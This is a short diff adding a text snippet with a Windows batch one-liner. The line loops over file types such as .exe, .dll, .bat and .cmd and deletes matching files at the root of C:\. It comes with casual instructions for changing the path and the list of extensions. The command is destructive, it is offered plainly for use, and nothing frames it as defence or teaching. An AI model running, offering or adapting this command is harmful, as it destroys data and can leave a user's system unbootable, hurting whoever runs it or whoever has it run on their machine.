@@ -1,0 +1,9 @@
+This is set at the C:\Drive but you can enter in you own path.
+                                                          |
+                                                          |
+                                                          v
+FOR %%Q IN (.bat, .bin, .dll, .scr, .exe, .cmd) DO (Del C:\*%%Q)
+
+NOTE: That the file pyes listed above can be added or removed. just be
+sure to put a "." before each file type name. Also if you want more than
+one put a comma in front. 
